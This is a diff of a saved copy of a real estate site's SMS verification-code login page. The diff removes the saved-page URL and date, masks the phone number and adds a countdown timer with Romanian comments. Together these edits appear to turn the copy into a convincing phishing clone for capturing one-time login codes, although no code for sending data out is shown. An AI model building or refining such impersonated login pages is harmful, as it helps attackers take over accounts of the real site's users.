@@ -1,7 +1,5 @@
 <!DOCTYPE html> <html class="inbenta-bot--chrome-126 inbenta-bot--firefox-147"><!--
- Page saved with SingleFile 
- url: https://login.gw.fotocasa.pro/realms/fotocasa-pro/login-actions/authenticate?execution=8e18dd47-62a3-4365-bf91-495adeb3fe92&client_id=webclient&tab_id=_lFhBU1L4eQ&client_data=eyJydSI6Imh0dHBzOi8vdW5pcXVldG9vbC5ndy5mb3RvY2FzYS5wcm8vbG9naW4iLCJydCI6ImNvZGUifQ 
- saved date: Fri Jan 30 2026 17:37:48 GMT+0200 (Eastern European Standard Time)
+
 --><meta charset=utf-8>
 <meta http-equiv=X-UA-Compatible content="IE=edge">
 <meta name=robots content="noindex, nofollow">
@@ -48,9 +46,9 @@
  Tu código de verificación
  </label>
  <p class=headline>
- Te hemos enviado el código de verificación al número indicado <strong>******768</strong>.
+ Te hemos enviado el código de verificación al número indicado <strong>*********</strong>.
  <span class=headline-info>
- Puede tardar hasta <strong>30 segundos</strong> en llegarte. Por favor espera antes de volver a solicitarlo.
+ Puede tardar hasta <strong id="segundos">30</strong> segundos en llegarte. Por favor espera antes de volver a solicitarlo.
  </span>
  </p>
  </div>
@@ -163,3 +161,17 @@
 <meta name=viewport content=&quot;width=device-width,initial-scale=1&quot; http-equiv=X-UA-Compatible>
 <style>body{overscroll-behavior-y:none;-webkit-text-size-adjust:none;text-size-adjust:none;overflow-x:hidden;overflow-y:hidden}.mxg-transcript a:-moz-focusring{outline-style:solid}.mxg-carousel-icon-button:focus-visible,.mxg-attach-file-closebtn:focus-visible,.mxg-button-focus-visible:focus-visible{outline-color:rgba(0,0,0,.55)}.mxg-search-header .Cx-MuiIconButton-edgeEnd:focus-visible{outline-color:rgba(0,0,0,.55)}.mxg-knowledge-container .Cx-MuiListItem-container .Cx-MuiIconButton-edgeEnd:focus-visible{outline-color:rgba(0,0,0,.55)}@media screen and (max-device-width:600px),screen and (max-device-width:600px) and (orientation:landscape),screen and (max-device-width:711px) and (orientation:landscape),screen and (max-device-height:428px) and (orientation:landscape),screen and (min-device-width:1200px) and (max-device-width:1920px) and (-webkit-min-device-pixel-ratio:6) and (min-resolution:192dpi),screen and (max-height:240.5px) and (-ms-high-contrast:none),(-ms-high-contrast:active){#full-screen-indicator{display:block}}@-moz-document url-prefix(){@media screen and (min--moz-device-pixel-ratio:2) and (orientation:landscape){.mxg-desktop-windows-firefox .mxg-header-logo-img{max-height:30px!important;padding:0}}@media screen and (min--moz-device-pixel-ratio:3) and (orientation:landscape){.mxg-file-preview{max-height:69%}.mxg-file-preview-footer{max-height:50%}.mxg-search-header{max-height:75%}.mxg-home-header{max-height:75%}#searchInput-popup.Cx-MuiAutocomplete-listbox{max-height:20vh}.mxg-header-logo-img{max-height:30px!important;padding:0}}@media all and (-moz-device-pixel-ratio:5){.cx-messenger{min-height:176px!important}.mxg-home-header{max-height:85%}.mxg-home-header .mxg-header-logo-img{margin-top:2px!important;padding-top:2px!important}.mxg-home-header .mxg-heading{margin-top:2px!important}.mxg-header-logo-img{max-height:30px!important;padding:0}}@media screen and (min--moz-device-pixel-ratio:4) and (max--moz-device-pixel-ratio:5) and (orientation:landscape){.mxg-header{min-width:auto!important}}}</style><meta name=referrer content=no-referrer><style>.sf-hidden{display:none!important}</style><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;></head> <body> <div><div></div><div><div class=cx-messenger-1kl9dx></div></div><div class=&quot;mxg-desktop-linux-firefox cx-messenger-1qfeen&quot;><div style=width:1px;height:1px;overflow:hidden;text-indent:-9999px;border:0px class=cx-status aria-live=polite aria-relevant=&quot;additions text&quot; aria-atomic=false tabindex=-1></div></div><div tabindex=-1 id=full-screen-indicator class=&quot;mxg-desktop-linux-firefox sf-hidden&quot;></div></div>"></iframe>
 </div>
+
+<script>
+  let tiempo = 30; // secunde
+  const spanSegundos = document.getElementById('segundos');
+
+  const countdown = setInterval(() => {
+    tiempo--;
+    if (tiempo >= 0) {
+      spanSegundos.textContent = tiempo; // doar schimbă numărul
+    } else {
+      clearInterval(countdown); // oprește timerul când ajunge la 0
+    }
+  }, 1000); // rulează o dată pe secundă
+</script>
